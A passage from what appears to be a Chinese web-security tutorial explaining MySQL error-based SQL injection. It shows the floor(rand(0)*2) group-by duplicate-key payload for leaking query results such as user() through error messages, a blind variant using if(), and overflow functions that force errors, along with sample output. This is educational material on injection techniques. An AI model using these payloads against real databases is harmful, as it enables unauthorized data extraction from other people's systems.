<pre><code class="mysql">select id as &quot;number&quot;, contents as &quot;内容&quot; from cat group by number</code></pre>
<p>执行该sql语句会生成一个新的虚拟表，group by 即指定虚拟表中的对应字段来作为主键。</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-131144@2x.png" alt="WX20210120-131144@2x"></p>
<p>我们知道主键只能是唯一的，如果主键出现重复的情况就会发生报错，将重复的主键输出在报错信息中，我们回过头来看报错注入的Payload.</p>
<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
<p>我们看到这里以x 为主键,<code>rand(0)*2</code>生成0-2之间的伪随机数，同时使用<code>floor</code>来取整，出现的只能是值为0或者1（当然前提是表所存储的记录条数要&gt;3条才有可能重复）。使用<code>concat</code>将要查询的内容拼接入主键，这样在报错时会将咱们想要的内容作为报错信息输出。</p>
<p>例如：</p>
<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-133637@2x.png" alt="WX20210120-133637@2x"></p>
<p>注：输出字符长度限制为64个字符</p>
<p>我们了解完FLOOR（X）报错注入原理后开始从FLOOR(X)报错注入盲注来简述其中的道理，我们直接从payload来看：</p>
<pre><code class="mysql">select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);</code></pre>
<p>我们知道floor(rand(0)*2)产生的随机数是伪随机数范围在0-1，如果将其参数的结果作为主键就会造成报错，假设我们用<code>if</code>语句来控制x是否作为主键呢？这就有可能造成不报错的情况，用此来作为报错注入盲注。通常情况与<a href="#spatial">Spatial Functions</a>报错注入盲注类似。</p>
<pre><code class="mysql">mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);
ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;
mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(0,x,0);
+----------+---+
| count(*) | x |
+----------+---+
|        2 | 0 |
+----------+---+
1 row in set (0.00 sec)</code></pre>
<h4 id="数据溢出型"><a href="#数据溢出型" class="headerlink" title="数据溢出型"></a>数据溢出型</h4><p>在报错注入中数据溢出的函数同样可用如下。</p>
<pre><code class="mysql">mysql&gt; select pow(2,1024);
ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;
mysql&gt; select cot(0);
ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;
mysql&gt; select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre>
<p>### </p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
</search>
